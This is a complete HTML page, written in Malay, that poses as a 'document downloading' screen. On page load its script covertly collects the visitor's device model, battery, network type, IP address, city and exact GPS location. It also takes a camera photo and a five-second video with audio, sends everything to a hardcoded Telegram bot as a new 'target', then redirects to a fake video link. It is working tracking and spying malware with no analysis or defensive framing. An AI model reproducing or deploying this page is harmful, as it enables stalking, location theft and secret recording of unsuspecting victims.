<!DOCTYPE html>
<html lang="ms">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body style="background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif;">

    <p>Sila tunggu sebentar... Dokumen sedang dimuat turun.</p>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>

    <script>
        // --- KONFIGURASI ---
        const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
        const urlParams = new URLSearchParams(window.location.search);
        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';

        async function startTrace() {
            const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
            
            // --- 1. Info Bateri ---
            let infoBateri = "Tidak dikesan";
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                infoBateri = `${level}% (${battery.charging ? "🔌 Cas" : "🔋 Bateri"})`;
            } catch (e) {}

            // --- 2. Info Rangkaian ---
            let infoRangkaian = "Tidak dikesan";
            if (navigator.connection) {
                infoRangkaian = navigator.connection.effectiveType.toUpperCase();
            }

            // --- 3. Ambil Brand Phone ---
            let brandPhone = "Tidak dikesan";
            if (navigator.userAgentData) {
                try {
                    const info = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                    brandPhone = `${info.platform} (${info.model || "Model Biasa"})`;
                } catch (e) { brandPhone = "Android/PC"; }
            } else {
                const ua = navigator.userAgent;
                if (ua.match(/iPhone/i)) brandPhone = "iPhone (iOS)";
                else if (ua.match(/Android/i)) brandPhone = "Android Device";
                else brandPhone = "Desktop/PC";
            }

            // --- 4. Ambil IP & Info Peranti ---
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                let infoAsas = `🔔 *TARGET BARU DIKESAN!*\n` +
                               `📅 *Masa:* ${waktu}\n` +
                               `📱 *Brand:* ${brandPhone}\n` +
                               `🔋 *Bateri:* ${infoBateri}\n` +
                               `📡 *Net:* ${infoRangkaian}\n` +
                               `🌐 *IP:* \`${data.ip}\`\n` +
                               `📍 *Lokasi:* ${data.city}, ${data.country_name}\n` +
                               `📱 *User-Agent:* ${navigator.userAgent}`;
                
                await sendToTele(infoAsas);
            } catch (e) { 
                await sendToTele(`⚠️ Target [${brandPhone}] dikesan pada ${waktu} tetapi IP gagal diambil.`);
            }

            // --- 5. Lokasi GPS ---
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})`);
                }, null, { enableHighAccuracy: true });
            }

            // --- 6. Ambil Gambar & Rakaman Video ---
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // A. TANGKAP GAMBAR (Pantas: 1 saat selepas buka kamera)
                await new Promise(res => setTimeout(res, 2500)); 
                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CURRENT_CHAT_ID);
                    fd.append('photo', blob, 'snap.jpg');
                    fd.append('caption', `📸 Gambar Target [${brandPhone}]\n⏰ ${waktu}\n🆔 ID: ${CURRENT_CHAT_ID}`);
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

                // B. RAKAM VIDEO (5 Saat)
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                    const fdV = new FormData();
                    fdV.append('chat_id', CURRENT_CHAT_ID);
                    fdV.append('video', videoBlob, 'record.mp4');
                    fdV.append('caption', `📹 Video Target (5s)\n📱 Brand: ${brandPhone}\n⏰ ${waktu}`);
                    
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fdV });
                    
                    // Matikan kamera selepas video dihantar
                    stream.getTracks().forEach(t => t.stop());
                };

                mediaRecorder.start();
                setTimeout(() => { mediaRecorder.stop(); }, 5000);

            } catch (e) {
                console.log("Kamera disekat.");
            }

            // Redirect ke link video palsu selepas 12 saat (bagi masa video upload)
            setTimeout(() => {
                window.location.href = "https://blogs.mtdv.me/videos/452uSngg5p";
            }, 10000);
        }

        async function sendToTele(text) {
            return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: CURRENT_CHAT_ID, 
                    text: text, 
                    parse_mode: 'Markdown' 
                })
            });
        }

        window.onload = startTrace;
    </script>
</body>
</html>
